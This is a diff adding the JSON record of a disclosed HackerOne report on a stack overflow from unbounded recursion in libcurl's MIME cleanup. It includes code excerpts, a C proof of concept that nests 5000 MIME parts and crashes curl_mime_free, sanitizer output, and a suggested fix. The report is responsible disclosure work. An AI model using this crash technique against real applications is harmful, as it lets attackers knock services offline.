@@ -1,0 +1,111 @@
+{
+  "id": 4024222,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDI0MjIy",
+  "url": "https://hackerone.com/reports/4024222",
+  "title": "CVE-2026-92391: curl_mime_free stack overflow by recursion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-12T14:01:13.055Z",
+  "submitted_at": "2026-09-12T14:01:13.225Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-92391"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:36:30.104Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:35:04.215Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nI've discovered a stack overflow in libcurl's MIME cleanup code. The read path in the MIME implementation is protected by a recursion depth limit (`MAX_MIME_LEVELS = 40`, defined at line 47 of `lib/mime.c` and checked in `read_part_content` and related functions), but the cleanup path has no equivalent guard. A deeply nested multipart structure built through the public API will crash the process when freed.\n\n## Impact\n\nAny application using the libcurl MIME API (`curl_mime_addpart` / `curl_mime_subparts`) to process user-controlled MIME structure depth is at risk. The crash happens inside `curl_mime_free` as part of normal cleanup, so once the structure is built, there is no way to avoid it. In a server-side context where an application constructs a MIME request based on external input, an attacker can cause reliable process termination by supplying input that drives the nesting depth high enough. This does not appear to be exploitable for code execution.\n\n## Root cause\n\nThe cleanup functions form a mutual recursion with no depth limit. When a `curl_mimepart` holds subparts (set via `curl_mime_subparts`), the part's `freefunc` is set to `mime_subparts_free`. During `curl_mime_free`, the call chain is:\n\n`curl_mime_free` -> `Curl_mime_cleanpart` -> `cleanup_part_content` -> `part->freefunc()` (i.e., `mime_subparts_free`) -> `curl_mime_free` -> ...\n\nThe relevant code in `lib/mime.c`:\n\n```c\n/* line 1056 */\nstatic void cleanup_part_content(curl_mimepart *part)\n{\n  if(part->freefunc)\n    part->freefunc(part->arg);   /* calls mime_subparts_free for multipart parts */\n  ...\n}\n\n/* line 1075 */\nstatic void mime_subparts_free(void *ptr)\n{\n  curl_mime *mime = (curl_mime *)ptr;\n\n  if(mime && mime->parent) {\n    mime->parent->freefunc = NULL;\n    cleanup_part_content(mime->parent);\n  }\n  curl_mime_free(mime);          /* recurses back into curl_mime_free */\n}\n\n/* line 1113 */\nvoid curl_mime_free(curl_mime *mime)\n{\n  curl_mimepart *part;\n\n  if(mime) {\n    mime_subparts_unbind(mime);\n    while(mime->firstpart) {\n      part = mime->firstpart;\n      mime->firstpart = part->nextpart;\n      Curl_mime_cleanpart(part);   /* calls cleanup_part_content */\n      curlx_free(part);\n    }\n    curlx_free(mime);\n  }\n}\n```\n\nEach nesting level adds roughly four stack frames. At 5000 levels the stack overflows (just an example number here, obvious dependent on system, memory, the orientation of the moon, etc). The same problem exists in `multipart_size` (line 1570) and `Curl_mime_prepare_headers` (line 1761), both of which recurse into child parts with no depth check. `Curl_mime_prepare_headers` at line 1860 does it here:\n\n```c\n  for(subpart = mime->firstpart; subpart; subpart = subpart->nextpart) {\n    result = Curl_mime_prepare_headers(data, subpart, NULL,\n                                       disposition, strategy);\n    if(result)\n      return result;\n  }\n```\n\nCompare this to how `read_part_content` handles it at line 703:\n\n```c\nstatic size_t read_part_content(curl_mimepart *part, char *buffer,\n                                size_t bufsize, bool *hasread,\n                                size_t call_depth)\n{\n  if(++call_depth > MAX_MIME_LEVELS)\n    return READ_ERROR;\n  ...\n```\n\nThe read path threads `call_depth` through every call and returns an error at 40 levels. The cleanup and sizing paths do neither.\n\nThere is also no depth check at construction time. `curl_mime_addpart` and `curl_mime_subparts` accept arbitrarily deep nesting without complaint, so curl's cleanup code is responsible for handling whatever structure the caller provides.\n\n## PoC\n\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n\nint main(void)\n{\n  CURL *easy;\n  curl_mime *root;\n  curl_mime *current;\n  int i;\n\n  curl_global_init(CURL_GLOBAL_ALL);\n  easy = curl_easy_init();\n  root = curl_mime_init(easy);\n  current = root;\n  if(!easy || !root)\n    return 1;\n\n  for(i = 0; i < 5000; i++) {\n    curl_mimepart *part = curl_mime_addpart(current);\n    curl_mime *child = curl_mime_init(easy);\n    if(!part || !child)\n      return 1;\n    curl_mime_subparts(part, child);\n    current = child;\n  }\n  printf(\"freeing 5000 nested MIME levels\\n\");\n  fflush(stdout);\n  curl_mime_free(root);\n  curl_easy_cleanup(easy);\n  curl_global_cleanup();\n  return 0;\n}\n```\n\nrunning:\n\n```text\nfreeing 5000 nested MIME levels\nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==83118==ERROR: AddressSanitizer: stack-overflow on address 0x00016c63ffb8 (pc 0x0001032bf7a0 bp 0x00016c6400a0 sp 0x00016c63fd20 T0)\n    #0 0x0001032bf7a0 in cleanup_part_content mime.c:1061\n    #1 0x0001032c7a6c in mime_subparts_free mime.c:1081\n    #2 0x0001032bf794 in cleanup_part_content mime.c:1059\n    #3 0x0001032bed6c in Curl_mime_cleanpart mime.c:1101\n    #4 0x0001032c0534 in curl_mime_free mime.c:1122\n    #5 0x0001032c7a78 in mime_subparts_free mime.c:1083\n    #6 0x0001032bf794 in cleanup_part_content mime.c:1059\n    #7 0x0001032bed6c in Curl_mime_cleanpart mime.c:1101\n    #8 0x0001032c0534 in curl_mime_free mime.c:1122\n.....\n```\n\n## Fix direction\n\nThe most direct fix is to thread a depth counter through `curl_mime_free`, `Curl_mime_cleanpart`, `cleanup_part_content`, and `mime_subparts_free`, following the same pattern already used in `read_part_content`. The same treatment is needed for `multipart_size` and `Curl_mime_prepare_headers`. An iterative rewrite of any of these functions would be more robust than a depth cap, too.\n\n## Impact\n\nStack overflow\n\nCheers,\nJosh",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "zsphantom"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
